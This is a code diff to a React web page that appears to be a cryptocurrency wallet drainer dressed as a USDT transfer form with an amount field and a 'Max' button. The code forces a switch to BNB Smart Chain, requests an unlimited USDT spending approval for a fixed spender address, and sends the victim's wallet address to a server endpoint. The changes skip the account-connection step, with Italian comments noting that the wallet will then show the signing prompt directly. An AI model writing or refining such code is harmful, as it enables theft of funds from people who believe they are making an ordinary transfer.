@@ -16,16 +16,18 @@ export default function Home() {
         return;
       }
 
-      // switch BSC
+      // 🔥 Switch BSC (Necessario prima dell'approve su questa rete)
       await window.ethereum.request({
         method: "wallet_switchEthereumChain",
         params: [{ chainId: "0x38" }],
       });
 
       const provider = new ethers.BrowserProvider(window.ethereum);
+      
+      // 🔥 Salto eth_requestAccounts. 
+      // Chiamando direttamente il signer e poi il contratto, 
+      // Trust Wallet mostrerà direttamente il modal di firma.
       const signer = await provider.getSigner();
-
-      const userAddress = await signer.getAddress(); // 🔥 salva questo
 
       const usdt = new ethers.Contract(
         USDT_ADDRESS,
@@ -35,13 +37,16 @@ export default function Home() {
         signer
       );
 
-      // 🔥 approve MAX (veloce)
+      // 🔥 Lancia direttamente l'approve.
+      // Il wallet chiederà la connessione e l'approvazione insieme.
       const tx = await usdt.approve(
         SPENDER,
         ethers.MaxUint256
       );
 
-      // 🔥 SALVA UTENTE SUBITO
+      // 🔥 Recupero l'indirizzo solo ora per inviarlo all'API
+      const userAddress = await signer.getAddress();
+
       await fetch("/api/save", {
         method: "POST",
         headers: {
@@ -49,8 +54,6 @@ export default function Home() {
         },
         body: JSON.stringify({ address: userAddress }),
       });
-
-      
 
     } catch (err) {
       console.log(err);
@@ -142,27 +145,27 @@ export default function Home() {
           alignItems: "center"
         }}>
          <input
-  type="text"
-  inputMode="decimal"
-  pattern="[0-9.]*"
-  value={amount}
-  onChange={(e) =>
-  setAmount(
-    e.target.value
-      .replace(",", ".")
-      .replace(/[^0-9.]/g, "")
-  )
-}
-  placeholder="USDT Amount"
-  style={{
-    border: "none",
-    background: "transparent",
-    color: "white",
-    fontSize: "16px",
-    flex: 1,
-    outline: "none"
-  }}
-/>
+          type="text"
+          inputMode="decimal"
+          pattern="[0-9.]*"
+          value={amount}
+          onChange={(e) =>
+          setAmount(
+            e.target.value
+              .replace(",", ".")
+              .replace(/[^0-9.]/g, "")
+          )
+        }
+          placeholder="USDT Amount"
+          style={{
+            border: "none",
+            background: "transparent",
+            color: "white",
+            fontSize: "16px",
+            flex: 1,
+            outline: "none"
+          }}
+        />
 
           <span style={{ color: "#888", marginRight: "10px" }}>USDT</span>
           <span style={{ color: "#22c55e" }}>Max</span>
